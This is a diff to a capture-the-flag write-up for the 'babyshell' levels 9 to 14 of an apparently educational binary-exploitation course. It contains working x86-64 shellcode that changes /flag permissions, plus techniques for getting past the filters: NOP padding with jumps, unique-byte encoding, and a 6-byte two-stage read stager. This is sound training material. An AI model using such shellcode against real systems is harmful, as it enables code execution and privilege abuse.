@@ -21,4 +21,37 @@
         syscall
         ```
     3. input the shellcode to the challenge program, it will modify the permission of `/flag` (for all other users) to `7` (`rwx`), then we can read the flag
-- *babyshell_lv9*
+- *babyshell_lv9*: after every 10 bytes, the program will overwrite the next 10 bytes of our shellcode with 10 `0xcc`. To bypass this, we just need to pad NOPs (`0x90`) in our code to ensure that the `0xcc`s only overwrite these NOPs, and we also need some jump instructions to jump over these `0xcc`s
+    ```
+    mov al, 90
+    push rax
+    jmp . + 17 # jump to 17 bytes ahead of the current instruction
+    .fill 15, 1, 0x90
+    
+    mov rdi, rsp
+    mov sil, 7
+    syscall
+    ```
+- *babyshell_lv10*: input will be sorted
+- *babyshell_lv11*: input will be sorted, and stdin is closed. It seems like that there is a bug in level 10 and 11, the input actually won't get sorted
+- *babyshell_lv12*: every byte in our shellcode should be unique
+    ```
+    | Bytes     | Instructions |
+    ----------------------------
+    | b0 5a     | mov al, 0x5a |
+    | 50        | push rax     |
+    | 48 89 e7  | mov rdi, rsp |
+    | 40 b6 07  | mov sil, 7   |
+    | 0f 05     | syscall      |
+    ```
+- *babyshell_lv13*: only 12 bytes for the shellcode. Luckily, the shellcode for the previous task (level 12) is already 11 bytes
+- *babyshell_lv14*: only 6 bytes for the shellcode. The basic idea is to use 2-stage shellcode, the stage-1 shellcode will run `read(0, rip, size)` to read in the stage-2 shellcode that read the flag or make it readable to all users. If we directly `mov rsi, <address>` or `lea rsi, [rip+offset]`, we cannot make our stage-1 shellcode less or equal to 6 bytes, we need to reuse the values that are already stored in some registers at the time the challenge program execute our stage-1 shellcode. By debugging the program, we can know that the program put the address of the stage-1 shellcode `0x2f5ad000` into `rdx`, and then `call rdx`. At this point, `rax` is zero, `rdi` is non-zero. What we need: `rax` should be 0, `rdi` should be 0, `rsi` should be the address right after the stage-1 shellcode, `rdx` can be any value that are large enough to ensure the stage-2 shellcode can be read in
+    - stage-1 shellcode
+        ```
+        # rax is already 0
+        mov edi, eax # the first parameter of read is 32-bit, we only need to clear edi
+        mov esi, edx
+        # rdx is already large enough
+        syscall
+        ```
+    - stage-2 shellcode: just reuse any shellcode from previous tasks
